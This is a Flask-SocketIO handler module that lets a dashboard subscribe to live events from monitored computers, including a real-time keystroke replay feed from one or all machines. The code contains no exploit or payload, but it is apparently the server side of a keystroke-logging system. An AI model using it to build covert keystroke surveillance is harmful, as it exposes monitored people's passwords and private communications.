"""
WebSocket Handlers for Live Updates
"""
from flask_socketio import emit, join_room, leave_room
from datetime import datetime


def register_socket_events(socketio):
    """Register all WebSocket event handlers"""
    
    @socketio.on('connect', namespace='/live')
    def handle_connect():
        """Handle new dashboard connection"""
        print(f"Dashboard connected: {datetime.utcnow().isoformat()}")
        emit('connected', {
            'message': 'Connected to live feed',
            'timestamp': datetime.utcnow().isoformat()
        })
    
    @socketio.on('disconnect', namespace='/live')
    def handle_disconnect():
        """Handle dashboard disconnection"""
        print(f"Dashboard disconnected: {datetime.utcnow().isoformat()}")
    
    @socketio.on('subscribe_computer', namespace='/live')
    def handle_subscribe(data):
        """Subscribe to events from a specific computer"""
        computer_id = data.get('computer_id')
        if computer_id:
            join_room(f'computer_{computer_id}')
            emit('subscribed', {
                'computer_id': computer_id,
                'message': f'Subscribed to computer {computer_id}'
            })
            print(f"Dashboard subscribed to computer {computer_id}")
    
    @socketio.on('unsubscribe_computer', namespace='/live')
    def handle_unsubscribe(data):
        """Unsubscribe from a specific computer's events"""
        computer_id = data.get('computer_id')
        if computer_id:
            leave_room(f'computer_{computer_id}')
            emit('unsubscribed', {
                'computer_id': computer_id,
                'message': f'Unsubscribed from computer {computer_id}'
            })
            print(f"Dashboard unsubscribed from computer {computer_id}")
    
    @socketio.on('subscribe_all', namespace='/live')
    def handle_subscribe_all():
        """Subscribe to events from all computers"""
        join_room('all_events')
        emit('subscribed', {
            'message': 'Subscribed to all computer events'
        })
        print("Dashboard subscribed to all events")
    
    @socketio.on('unsubscribe_all', namespace='/live')
    def handle_unsubscribe_all():
        """Unsubscribe from all computers events"""
        leave_room('all_events')
        emit('unsubscribed', {
            'message': 'Unsubscribed from all computer events'
        })
        print("Dashboard unsubscribed from all events")
    
    @socketio.on('subscribe_live_keystrokes', namespace='/live')
    def handle_subscribe_live_keystrokes(data):
        """
        Subscribe to live keystrokes from a specific computer or all computers.
        This is specifically for the real-time keystroke replay feature.
        """
        computer_id = data.get('computer_id')
        if computer_id:
            # Subscribe to specific computer's live keystrokes
            join_room(f'computer_{computer_id}')
            emit('subscribed_live_keystrokes', {
                'computer_id': computer_id,
                'message': f'Subscribed to live keystrokes from computer {computer_id}'
            })
            print(f"Dashboard subscribed to live keystrokes from computer {computer_id}")
        else:
            # Subscribe to all computers' live keystrokes
            join_room('all_events')
            emit('subscribed_live_keystrokes', {
                'computer_id': 'all',
                'message': 'Subscribed to live keystrokes from all computers'
            })
            print("Dashboard subscribed to live keystrokes from all computers")
    
    @socketio.on('unsubscribe_live_keystrokes', namespace='/live')
    def handle_unsubscribe_live_keystrokes(data):
        """Unsubscribe from live keystrokes"""
        computer_id = data.get('computer_id')
        if computer_id:
            leave_room(f'computer_{computer_id}')
            emit('unsubscribed_live_keystrokes', {
                'computer_id': computer_id,
                'message': f'Unsubscribed from live keystrokes from computer {computer_id}'
            })
        else:
            leave_room('all_events')
            emit('unsubscribed_live_keystrokes', {
                'computer_id': 'all',
                'message': 'Unsubscribed from live keystrokes from all computers'
            })
    
    @socketio.on('ping', namespace='/live')
    def handle_ping():
        """Handle ping for connection keep-alive"""
        emit('pong', {
            'timestamp': datetime.utcnow().isoformat()
        })

